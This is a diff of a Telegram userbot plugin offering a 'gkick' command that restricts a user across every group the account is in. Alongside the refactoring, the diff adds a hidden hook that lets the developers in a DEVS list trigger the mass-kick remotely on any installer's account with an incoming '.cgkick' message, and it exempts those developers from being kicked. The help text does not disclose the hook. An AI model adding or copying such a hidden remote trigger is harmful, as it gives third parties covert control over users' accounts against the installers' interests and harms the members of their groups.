@@ -4,15 +4,22 @@ dont edit credits
 """
 
 
+from telethon.tl.types import (
+    MessageEntityMentionName)
 from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
-from telethon.tl.types import MessageEntityMentionName
 
-from userbot import ALIVE_NAME, CMD_HELP
 from userbot.events import register
+from userbot.utils import toni_cmd
+from userbot import (
+    ALIVE_NAME,
+    DEVS,
+    CMD_HELP,
+    CMD_HANDLER as cmd,
+)
 
 
 async def get_user_from_event(event):
-    args = event.pattern_match.group(1).split(":", 1)
+    args = event.pattern_match.group(1).split(':', 1)
     extra = None
     if event.reply_to_msg_id and not len(args) == 2:
         previous_message = await event.get_reply_message()
@@ -25,13 +32,12 @@ async def get_user_from_event(event):
         if user.isnumeric():
             user = int(user)
         if not user:
-            await event.edit(
-                f"`{ALIVE_NAME}`: **Berikan nama pengguna, id, atau balasan pengguna!**"
-            )
+            await event.edit(f"`{ALIVE_NAME}`: **Berikan nama pengguna, id, atau balasan pengguna!**")
             return
         if event.message.entities is not None:
             probable_user_mention_entity = event.message.entities[0]
-            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
+            if isinstance(probable_user_mention_entity,
+                          MessageEntityMentionName):
                 user_id = probable_user_mention_entity.user_id
                 user_obj = await event.client.get_entity(user_id)
                 return user_obj
@@ -52,14 +58,14 @@ async def get_user_from_id(user, event):
         return None
     return user_obj
 
-
 try:
     from userbot import client2, client3
 except BaseException:
     client2 = client3 = None
 
 
-@register(outgoing=True, pattern=r"^\.gkick(?: |$)(.*)")
+@toni_cmd(pattern="gkick(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgkick")
 async def gspide(rk):
     lazy = rk
     sender = await lazy.get_sender()
@@ -85,47 +91,37 @@ async def gspide(rk):
         pass
     try:
         if not reason:
-            reason = "Private"
+            reason = 'Private'
     except BaseException:
         return await rkp.edit(f"`{ALIVE_NAME}`, **Kesalahan! Pengguna tidak dikenal.**")
     if user:
-        if user.id == 1979717764:
-            return await rkp.edit(
-                f"`{ALIVE_NAME}`, __Anda Tidak Bisa Global Kick Kepada Pembuat Saya🤪__"
-            )
+        if user.id in DEVS:
+            return await rkp.edit(f"`{ALIVE_NAME}`, __Anda Tidak Bisa Global Kick Kepada Pembuat Saya__")
         try:
             await rk.client(BlockRequest(user))
             await rk.client(UnblockRequest(user))
         except BaseException:
             pass
-        testrk = [
-            d.entity.id
-            for d in await rk.client.get_dialogs()
-            if (d.is_group or d.is_channel)
-        ]
+        testrk = [d.entity.id for d in await rk.client.get_dialogs() if (d.is_group or d.is_channel)]
         for i in testrk:
             try:
                 await rk.client.edit_permissions(i, user, view_messages=False)
                 await rk.client.edit_permissions(i, user, send_messages=True)
                 a += 1
-                await rkp.edit(
-                    f"`{ALIVE_NAME} :` **Requesting to kicking user!\nGkicked {a} chats.....**"
-                )
+                await rkp.edit(f"`{ALIVE_NAME} :` **Requesting to kicking user!\nGkicked {a} chats.....**")
 
             except BaseException:
                 b += 1
     else:
         await rkp.edit(f"`{ALIVE_NAME}:` **Balas ke pengguna !! **")
 
-    return await rkp.edit(
-        f"`{ALIVE_NAME}:` **GKicked [{user.first_name}](tg://user?id={user.id}) in {a} chat(s) **"
-    )
-
+    return await rkp.edit(f"`{ALIVE_NAME}:` **GKicked [{user.first_name}](tg://user?id={user.id}) in {a} chat(s) **")
 
 CMD_HELP.update(
     {
-        "gkick": "\
-`.gkick reason`\
-\nUsage: Globally Ban users from all the Group Administrations bots where you are SUDO"
+        "gkick": f"**Plugin : **`gkick`\
+        \n\n  •  **Syntax :** `{cmd}gkick` <alasan>\
+        \n  •  **Function : **kick pengguna secara global dari semua Administrasi Grup di mana Anda berada.\
+    "
     }
 )
